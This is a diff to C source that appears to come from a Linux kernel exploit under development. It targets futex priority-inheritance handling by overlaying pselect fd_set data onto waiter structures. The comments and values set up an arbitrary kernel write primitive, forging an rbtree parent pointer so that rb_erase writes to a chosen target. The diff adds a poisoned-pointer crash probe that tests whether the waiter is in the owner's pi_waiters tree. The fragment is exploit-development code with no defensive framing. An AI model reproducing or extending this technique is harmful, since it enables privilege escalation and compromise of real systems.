@@ -117,18 +117,23 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
      * Words 5-7 cover pi_tree_entry (+0x18..+0x2f).
      * task(+0x30) and lock(+0x38) are beyond the copy window.
      *
-     * Phase 3 PI CHAIN WRITE PRIMITIVE:
-     * waiter priority boosted to nice=-20 causes requeue to add waiter
-     * to owner's pi_waiters tree via pi_tree_entry.
-     * pselect overlay sets pi_tree_entry.__rb_parent_color = (target-8)|1.
-     * Consumer FUTEX_LOCK_PI chain walk reorganizes pi_waiters →
-     * rb_erase(waiter) reads parent = target-8 → writes to target. */
-    {2, (uint64_t)((pselect_custom_target - 8) | 1), "tree_pc"},
-    {3, 0, "tree_right"},
-    {4, 0, "tree_left"},
-    {5, (uint64_t)((pselect_custom_target - 8) | 1), "pi_pc"},
-    {6, 0, "pi_right"},
-    {7, 0, "pi_left"},
+     /* Phase 3 PI CHAIN WRITE PRIMITIVE:
+      * waiter priority boosted to nice=-20 causes requeue to add waiter
+      * to owner's pi_waiters tree via pi_tree_entry.
+      * pselect overlay sets pi_tree_entry.__rb_parent_color = (target-8)|1.
+      * Consumer FUTEX_LOCK_PI chain walk reorganizes pi_waiters →
+      * rb_erase(waiter) reads parent = target-8 → writes to target. */
+     {2, (uint64_t)((pselect_custom_target - 8) | 1), "tree_pc"},
+     {3, 0, "tree_right"},
+     {4, 0, "tree_left"},
+     /* PI_WAITERS DIAGNOSTIC (2026-08-17): poison pi_tree_entry to force
+      * a crash IF the waiter is in owner's pi_waiters tree.
+      * 0xdead000000000001 & ~3 = 0xdead000000000000 → deref → page fault.
+      * If waiter NOT in pi_waiters: chain walk skips → no crash.
+      * This is a binary probe: crash = YES, stable = NO. */
+     {5, 0xdead000000000001ULL, "pi_pc_probe"},
+     {6, 0, "pi_right"},
+     {7, 0, "pi_left"},
 #else
     {2, 0, "tree_pc"},
     {3, 0, "tree_right"},
